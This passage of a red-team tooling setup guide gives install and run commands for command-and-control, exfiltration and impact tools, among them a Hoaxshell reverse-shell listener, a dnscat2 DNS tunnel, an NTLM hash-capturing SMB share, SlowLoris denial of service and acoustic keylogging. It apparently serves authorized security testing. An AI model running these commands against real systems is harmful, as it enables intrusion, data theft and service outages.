  cd /opt/redteam/NimPlant/client && nimble install -d
  cd /opt/redteam/NimPlant
  python3 -m venv .venv && .venv/bin/pip install -r server/requirements.txt
  ```
* **Run:**
  ```bash
  cd /opt/redteam/NimPlant
  .venv/bin/python NimPlant.py compile all
  .venv/bin/python NimPlant.py server
  ```

#### Hoaxshell
* **Install:**
  ```bash
  git clone https://github.com/t3l3machus/hoaxshell.git /opt/redteam/hoaxshell
  cd /opt/redteam/hoaxshell
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  chmod +x hoaxshell.py
  ```
* **Run:**
  ```bash
  sudo /opt/redteam/hoaxshell/.venv/bin/python /opt/redteam/hoaxshell/hoaxshell.py -s <YOUR_IP>
  ```

---

### 13. Exfiltration

#### Dnscat2
* **Install:**
  ```bash
  sudo dnf install -y ruby ruby-devel rubygems make gcc
  git clone https://github.com/iagox86/dnscat2.git /opt/redteam/dnscat2
  cd /opt/redteam/dnscat2/client && make
  cd /opt/redteam/dnscat2/server && gem install bundler && bundle install
  ```
* **Run:**
  ```bash
  # Server
  cd /opt/redteam/dnscat2/server && ruby ./dnscat2.rb example.com
  # Client
  /opt/redteam/dnscat2/client/dnscat example.com
  ```

#### Cloakify
* **Install:**
  ```bash
  git clone https://github.com/TryCatchHCF/Cloakify.git /opt/redteam/Cloakify
  ```
* **Run:**
  ```bash
  python3 /opt/redteam/Cloakify/cloakify.py secret.txt /opt/redteam/Cloakify/ciphers/desserts.ciph > cloaked.txt
  python3 /opt/redteam/Cloakify/decloakify.py cloaked.txt /opt/redteam/Cloakify/ciphers/desserts.ciph
  ```

#### PyExfil
* **Install:**
  ```bash
  git clone https://github.com/ytisf/PyExfil.git /opt/redteam/PyExfil
  cd /opt/redteam/PyExfil
  python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
  ```
* **Run:**
  ```bash
  /opt/redteam/PyExfil/.venv/bin/python -c "import pyexfil"
  ```

#### GD-Thief
* **Install:**
  ```bash
  git clone https://github.com/antman1p/GD-Thief.git /opt/redteam/GD-Thief
  cd /opt/redteam/GD-Thief
  python3 -m venv .venv && .venv/bin/pip install --upgrade google-api-python-client google-auth-httplib2 google-auth-oauthlib
  ```
* **Run:**
  ```bash
  /opt/redteam/GD-Thief/.venv/bin/python /opt/redteam/GD-Thief/gd_thief.py -h
  ```

#### goshs
* **Install:**
  ```bash
  go install goshs.de/goshs/v2@latest
  ```
* **Run:**
  ```bash
  goshs                                      # Serve current directory
  goshs -s -ss -b user:password              # Serve over HTTPS (self-signed) with Basic Auth
  goshs -smb -smb-domain CORP                # SMB share & NTLM hash capture
  ```

---

### 14. Impact / Hardware / Acoustic Research

#### SlowLoris
* **Install:**
  ```bash
  pipx install slowloris
  ```
* **Run:**
  ```bash
  slowloris example.com
  ```

#### usbkill
* **Install:**
  ```bash
  git clone https://github.com/hephaest0s/usbkill.git /opt/redteam/usbkill
  cd /opt/redteam/usbkill
  python3 -m venv .venv && .venv/bin/pip install .
  ```
* **Run:**
  ```bash
  sudo /opt/redteam/usbkill/.venv/bin/usbkill
  ```

#### Keytap (`kbd-audio`)
* **Install:**
  ```bash
  sudo dnf install -y cmake gcc-c++ SDL2-devel fftw-devel
  git clone --recursive https://github.com/ggerganov/kbd-audio.git /opt/redteam/kbd-audio
  cd /opt/redteam/kbd-audio
  mkdir -p build && cd build && cmake .. && make -j$(nproc)
  ```
* **Run:**
  ```bash
  /opt/redteam/kbd-audio/build/record-full output.kbd
  /opt/redteam/kbd-audio/build/play-full output.kbd
  ```
